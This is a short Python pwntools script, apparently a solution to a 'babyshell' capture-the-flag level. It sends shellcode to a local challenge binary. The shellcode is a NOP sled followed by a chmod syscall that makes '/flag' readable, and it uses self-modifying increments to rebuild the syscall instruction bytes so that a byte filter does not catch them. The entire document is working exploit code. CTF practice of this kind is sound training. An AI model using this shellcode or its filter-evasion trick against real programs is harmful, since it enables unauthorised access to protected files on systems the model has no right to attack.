import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = "/challenge/babyshell_level6"

# %rax	System call	%rdi	                %rsi	        %rdx
# 90	sys_chmod	const char *filename	mode_t mode
shellcode = f'''
.rept 4096
    nop
.endr

lea rdi, [rip + _flag_addr]
mov sil, 4
mov al, 90
inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05

mov dil, 0
mov al, 60

inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05

_flag_addr:
    .ascii "/flag"
'''

shellcode = asm(shellcode)

with process([binary]) as p:
    p.readuntilS("Reading 0x2000 bytes from stdin.")
    p.send(shellcode)
    print(p.interactive())
